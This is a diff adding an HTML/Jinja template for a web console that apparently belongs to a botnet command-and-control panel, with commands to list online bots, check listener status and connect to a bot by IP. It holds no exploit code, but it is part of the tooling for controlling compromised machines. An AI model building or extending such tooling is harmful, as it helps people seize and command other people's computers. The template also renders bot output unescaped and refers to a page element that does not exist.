@@ -1,0 +1,39 @@
+{% extends "layout.html" %}
+
+{% block activeindex %}active{% endblock %}
+
+{% block content %}
+    <div class="container d-flex" style="margin-left: 20%">
+        <div id="console" class="m-2 mb-0 mt-5" style="width: 1000px;">
+            <div id="console-text" class="p-2 rounded border border-secondary bg-dark text-primary" style="overflow: scroll; height: 700px;">
+                {% if data %}
+                    {% for item in data %}
+                        <p>{{ item | replace('<DIR>', 'DIR') | safe }}</p>
+                    {% endfor %}
+                {% else %}
+                    <p class="text-primary">You are not connected to any bot</p>
+                    <span class="text-secondary">
+                        Try "status" to show listener status<br>
+                        "show" to show online bots<br>
+                        "connect {ip}" to connect to bot<br>
+                        You can check documentation page for get more help
+                    </span>
+                {% endif %}
+                <br>
+                {{ get_flashed_messages()[0]|safe }}
+            </div>
+            <form action="" method="post">
+                {{ form.command(class="form-control bg-dark text-success border border-secondary", placeholder=">_", id="command_input") }}
+                {{ form.submit(class="form-control bg-dark text-light border border-top-0 border-secondary") }}
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("command_input").focus();
+        let block = document.getElementById("console-text")
+        let block2 = document.getElementById("console-text2")
+        block.scrollTop = block.scrollHeight;
+        block2.scrollTop = block.scrollHeight;
+    </script>
+{% endblock %}
